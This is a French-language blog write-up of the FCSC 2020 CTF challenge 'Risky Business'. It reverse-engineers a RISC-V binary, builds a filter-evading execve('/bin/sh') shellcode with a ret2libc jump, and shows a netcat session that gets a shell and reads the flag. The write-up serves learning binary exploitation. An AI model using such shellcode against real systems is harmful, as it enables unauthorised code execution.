<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>[FR] Write-up FCSC 2020 : Risky Business - redoste</title>
<link rel=stylesheet type=text/css href=/css/main.css></head><body><header><a href=/><h2>redoste</h2></a><nav><ul><li><a href=/about/>About</a></li><li><a href=/projects/>Projects</a></li><li><a href=/posts/index.xml>RSS</a></li></ul></nav></header><hr><main><h2>[FR] Write-up FCSC 2020 : Risky Business</h2><span class=date>2020-05-04 18:00 +0200</span><hr><nav><ul><li><a href=/tags/ctf/>CTF</a></li><li><a href=/tags/fcsc/>FCSC</a></li><li><a href=/tags/fcsc-2020/>FCSC 2020</a></li></ul></nav><hr><h1 id=i---intro>I - Intro</h1><p>Le challenge est composé d&rsquo;un simple binaire ELF RISC-V.</p><pre tabindex=0><code>$ file risky-business
risky-business: ELF 64-bit LSB shared object, UCB RISC-V, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-riscv64-lp64d.so.1, for GNU/Linux 4.15.0, BuildID[sha1]=..., not stripped
</code></pre><p>Le but est d&rsquo;exploiter ce binaire de manière à obtenir un shell sur la machine l&rsquo;exécutant. On peut interagir avec lui via une simple connexion TCP que l&rsquo;on peut établir avec <code>netcat</code>.</p><pre tabindex=0><code>nc challenges1.france-cybersecurity-challenge.fr 4004
</code></pre><p>À première vue le binaire semble accepter des données via l&rsquo;entrée standard avant de s&rsquo;arrêter.</p><h1 id=ii---rétro-ingénierie>II - Rétro-ingénierie</h1><p>Pour effectuer la rétro-ingénierie de ce binaire, j&rsquo;ai utilisé <em>Ghidra</em>. Sa dernière version (v9.1.2) ne supporte pas l&rsquo;architecture RISC-V, j&rsquo;ai donc dû compiler une version plus récente depuis les sources disponibles sur la branche <code>master</code> du GitHub.</p><p>La décompilation faite par Ghidra est plutôt précise, après avoir renommé les variables correctement nous obtenons la fonction <code>main()</code> suivante :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> input_buffer_len;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> ret;
</span></span><span style=display:flex><span>  byte c_2;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> j;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> k;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> input_buffer[<span style=color:#ae81ff>72</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> stk_check;
</span></span><span style=display:flex><span>  byte c_1;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  stk_check <span style=color:#f92672>=</span> __stack_chk_guard;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(input_buffer,<span style=color:#ae81ff>67</span>,stdin);
</span></span><span style=display:flex><span>  input_buffer_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(input_buffer);
</span></span><span style=display:flex><span>  i <span style=color:#f92672>=</span> input_buffer_len <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  j <span style=color:#f92672>=</span> input_buffer_len <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  k <span style=color:#f92672>=</span> (input_buffer_len <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  c_1 <span style=color:#f92672>=</span> (byte)input_buffer[input_buffer_len <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> k) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((k <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      c_2 <span style=color:#f92672>=</span> input_buffer[i] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>;
</span></span><span style=display:flex><span>      i <span style=color:#f92672>=</span> i <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      c_2 <span style=color:#f92672>=</span> (byte)input_buffer[j] <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>      j <span style=color:#f92672>=</span> j <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((((c_1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>&amp;&amp;</span> (c_2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span>)) <span style=color:#f92672>||</span> ((c_1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> (c_2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)))) <span style=color:#f92672>||</span> ((c_1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> (c_2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>10</span>))))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> k <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    c_1 <span style=color:#f92672>=</span> c_2;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  (<span style=color:#f92672>*</span>(code <span style=color:#f92672>*</span>)input_buffer)(input_buffer);
</span></span><span style=display:flex><span>end:
</span></span><span style=display:flex><span>  ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (stk_check <span style=color:#f92672>!=</span> __stack_chk_guard) {
</span></span><span style=display:flex><span>    ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>__stack_chk_fail</span>();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  gp <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>__global_pointer<span style=color:#960050;background-color:#1e0010>$</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>La fonction va donc lire une chaîne de caractères qui peut faire jusqu&rsquo;à 67 octets sur l&rsquo;entrée standard, un test va être effectué sur celle-ci, si elle passe le test, elle est interprétée comme du code et est exécutée, sinon le programme se termine.</p><p>Le test va lire la chaîne à partir de la fin, la séparer en section de 4 bits et vérifier que certains groupes prédéfinis de 4 bits ne se suivent pas.</p><p>On peut interpréter cela plus simplement : dans une représentation hexadécimale de la chaîne, les chiffres hexadécimaux suivants ne peuvent pas se suivre : 0x7 et 0x3; 0x0 et 0x0; 0x0 et 0xA.</p><h1 id=iii---écriture-de-la-base-du-shellcode>III - Écriture de la base du shellcode</h1><p>Cet article de blog décrit comment écrire un shellcode pour l&rsquo;architecture RISC-V : <a href=https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html>https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html</a>. Le but est donc de charger les arguments d&rsquo;un syscall dans les registres <code>a0</code> à <code>a6</code> et le numéro du syscall dans le registre <code>a7</code> avant d&rsquo;utiliser l&rsquo;instruction <code>ecall</code> pour l&rsquo;effectuer. Le syscall à appeler est le traditionnel <code>execve</code> (syscall n° 221 sous Linux en RISC-V) nous permettant d&rsquo;obtenir un shell en exécutant <code>/bin/sh</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>addi</span>	<span style=color:#66d9ef>a0</span>,<span style=color:#66d9ef>s0</span>,-<span style=color:#ae81ff>96</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>20</span> <span style=color:#75715e># le shellcode est chargé sur la stack à s0-96 : s0-96+20 pointe donc sur le dword plus
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                       <span style=color:#75715e># bas
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>slti</span>	<span style=color:#66d9ef>a1</span>,<span style=color:#66d9ef>zero</span>,-<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span>	<span style=color:#66d9ef>a2</span>,<span style=color:#66d9ef>zero</span>,-<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>li</span>	<span style=color:#66d9ef>a7</span>,<span style=color:#ae81ff>221</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ecall</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.dword</span> <span style=color:#ae81ff>0x68732f2f6e69622f</span> <span style=color:#75715e># représente la chaîne ascii `/bin//sh`
</span></span></span></code></pre></div><p>Ce shellcode de base est fonctionnel mais ne respecte pas les contraintes imposées par le binaire. La première suite interdite est la suite 0x00 dans l&rsquo;instruction <code>li</code>. On peut la remplacer par une instruction <code>addi</code> en effectuant une addition avec le registre <code>a1</code> précédemment initialisé à 0.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>addi</span>	<span style=color:#66d9ef>a0</span>,<span style=color:#66d9ef>s0</span>,-<span style=color:#ae81ff>96</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span>	<span style=color:#66d9ef>a1</span>,<span style=color:#66d9ef>zero</span>,-<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span>	<span style=color:#66d9ef>a2</span>,<span style=color:#66d9ef>zero</span>,-<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>addi</span>	<span style=color:#66d9ef>a7</span>,<span style=color:#66d9ef>a1</span>,<span style=color:#ae81ff>221</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ecall</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.dword</span> <span style=color:#ae81ff>0x68732f2f6e69622f</span>
</span></span></code></pre></div><p>La suite interdite suivante est présente dans la chaîne <code>/bin//sh</code>. Pour y remédier, on sépare le <code>dword</code> en deux <code>word</code> et l&rsquo;on <code>NOT</code> celui comportant la suite interdite. Il faut juste adapter le shellcode pour <em>&ldquo;réparer&rdquo;</em> le <code>word</code> avant d&rsquo;effectuer le syscall.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>addi</span> <span style=color:#66d9ef>a3</span>, <span style=color:#66d9ef>s0</span>, -<span style=color:#ae81ff>96</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>28</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>lw</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#ae81ff>4</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>not</span>  <span style=color:#66d9ef>a4</span>, <span style=color:#66d9ef>a4</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>sw</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#ae81ff>4</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>addi</span> <span style=color:#66d9ef>a0</span>, <span style=color:#66d9ef>s0</span>, -<span style=color:#ae81ff>96</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>28</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span> <span style=color:#66d9ef>a1</span>, <span style=color:#66d9ef>zero</span>, -<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span> <span style=color:#66d9ef>a2</span>, <span style=color:#66d9ef>zero</span>, -<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ecall</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0x6e69622f</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0x978cd0d0</span>
</span></span></code></pre></div><p>Il est à noter que le shellcode est assemblé avec l&rsquo;option <code>-march riscv64ic</code> permettant d&rsquo;ajouter l&rsquo;extension <code>C</code> du standard RISC-V. Celle-ci permet d&rsquo;avoir des instructions compressées de 2 octets au lieu de 4. Les instructions <code>lw</code> et <code>sw</code> du shellcode précédent ne font donc que 2 octets. Cette compression permet, en plus d&rsquo;économiser de l&rsquo;espace, de ne pas avoir d&rsquo;octets nuls dans le shellcode.</p><p>L&rsquo;instruction m&rsquo;ayant posé le plus de problème est <code>ecall</code>. Celle-ci est indispensable pour pouvoir effectuer le syscall mais n&rsquo;existe que sous une seule forme : <code>0x00000073</code>, elle contient donc 2 suites de demi octets interdites, 0x00 et 0x73. J&rsquo;ai d&rsquo;abord voulu essayer de mettre en place du <em>self-modifying code</em> en <code>NOT</code>ant l&rsquo;instruction et en la réparant avant de l&rsquo;exécuter. Cependant l&rsquo;émulateur RISC-V de QEMU n&rsquo;est pas encore au point et comme celui-ci <em>&ldquo;traduit&rdquo;</em> les instructions RISC-V en instructions x86, la traduction n&rsquo;est pas re-effectuée après que l&rsquo;instruction soit restaurée, provoquant un crash du programme.</p><hr><p><strong>EDIT : 2024-10-14</strong> : QEMU se comportait &ldquo;normalement&rdquo; en 2020, il faut utiliser l&rsquo;instruction <code>FENCE.I</code> pour s&rsquo;assurer que l&rsquo;écriture de la nouvelle instruction se fait avant sa lecture.</p><hr><h1 id=iv---ret2libc-pour-effectuer-le-syscall>IV - <code>ret2libc</code> pour effectuer le syscall</h1><p>La solution que j&rsquo;ai choisie pour effectuer le syscall est donc un <code>ret2libc</code>. Le but est de trouver une instruction <code>ecall</code> dans la libc et de <code>jmp</code> dessus. Comme le <code>Dockerfile</code> pour déployer le challenge est fourni, nous pouvons utiliser exactement la même libc que celle du serveur où s&rsquo;exécutera le shellcode final.</p><p>Bien que l&rsquo;ASLR soit activée, QEMU ne semble pas en avoir une très bonne (ou pas du tout), en effet après de multiples tests il semble que l&rsquo;adresse de base de la libc soit toujours la même : <code>0x4000827000</code>. Pour trouver cette adresse de base, il suffit de déboguer le programme avec <code>gdb</code> et de lire l&rsquo;adresse de <code>scanf</code> puis de la soustraire avec son adresse dans <code>libc.so</code>. Nous n&rsquo;avons qu&rsquo;à <code>grep</code>er la sortie de <code>objdump -D</code> sur la libc pour trouver un <code>ecall</code>.</p><p>Le <code>ecall</code> choisi est à l&rsquo;adresse <code>0xb68</code> de la libc et peut donc être trouvé à l&rsquo;adresse <code>0x4000827b68</code> dans l&rsquo;espace d&rsquo;adresse de notre binaire. Comme l&rsquo;adresse contient beaucoup de suites de demi octets interdites, celle-ci est <code>NOT</code>ée avant d&rsquo;être utilisée.</p><p>Voici donc le shellcode final :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>addi</span> <span style=color:#66d9ef>a3</span>, <span style=color:#66d9ef>s0</span>, -<span style=color:#ae81ff>96</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x30</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>lw</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#ae81ff>12</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>not</span>  <span style=color:#66d9ef>a4</span>, <span style=color:#66d9ef>a4</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>sw</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#ae81ff>12</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>addi</span> <span style=color:#66d9ef>a0</span>, <span style=color:#66d9ef>s0</span>, -<span style=color:#ae81ff>96</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x38</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span> <span style=color:#66d9ef>a1</span>, <span style=color:#66d9ef>zero</span>, -<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slti</span> <span style=color:#66d9ef>a2</span>, <span style=color:#66d9ef>zero</span>, -<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>addi</span> <span style=color:#66d9ef>a7</span>, <span style=color:#66d9ef>a1</span>, <span style=color:#ae81ff>221</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>lw</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#ae81ff>0</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>lw</span>   <span style=color:#66d9ef>a5</span>, <span style=color:#ae81ff>4</span>(<span style=color:#66d9ef>a3</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>not</span>  <span style=color:#66d9ef>a4</span>, <span style=color:#66d9ef>a4</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>not</span>  <span style=color:#66d9ef>a5</span>, <span style=color:#66d9ef>a5</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>slli</span> <span style=color:#66d9ef>a5</span>, <span style=color:#66d9ef>a5</span>, <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>or</span>   <span style=color:#66d9ef>a4</span>, <span style=color:#66d9ef>a5</span>, <span style=color:#66d9ef>a4</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>jr</span>   -<span style=color:#ae81ff>4</span>(<span style=color:#66d9ef>a4</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0xff7d8493</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0xffffffbf</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0x6e69622f</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>.word</span> <span style=color:#ae81ff>0x978cd0d0</span>
</span></span></code></pre></div><p>Comme l&rsquo;instruction <code>jr</code> nécessite un offset par rapport à l&rsquo;adresse contenue dans le registre, celui-ci ne pouvait donc pas être 0 sous peine de comporter beaucoup de suites de demi octets interdites. Le saut se fait donc avec un offset de -4 et l&rsquo;adresse a été adaptée en conséquence.</p><h1 id=v---exploitation-finale>V - Exploitation finale</h1><p>Après avoir assemblé le shellcode et l&rsquo;avoir testé en local, nous pouvons l&rsquo;exécuter sur le serveur.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ cat shellcode.bin - | nc -v challenges1.france-cybersecurity-challenge.fr <span style=color:#ae81ff>4004</span>
</span></span><span style=display:flex><span>Warning: inverse host lookup failed <span style=color:#66d9ef>for</span> 51.68.117.85: Unknown host
</span></span><span style=display:flex><span>challenges1.france-cybersecurity-challenge.fr <span style=color:#f92672>[</span>51.68.117.85<span style=color:#f92672>]</span> <span style=color:#ae81ff>4004</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ctf<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ctf<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ctf<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>flag
</span></span><span style=display:flex><span>risky-business
</span></span><span style=display:flex><span>run.sh
</span></span><span style=display:flex><span>cat flag
</span></span><span style=display:flex><span>FCSC<span style=color:#f92672>{</span>d79704401bf7c58ca46f3711a9a8c8207d0c4ce7d80fd0dc41df6d5e44b3ddaf<span style=color:#f92672>}</span>
</span></span></code></pre></div></main><hr><footer>© 2020 - 2024 redoste - <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a></footer></body></html>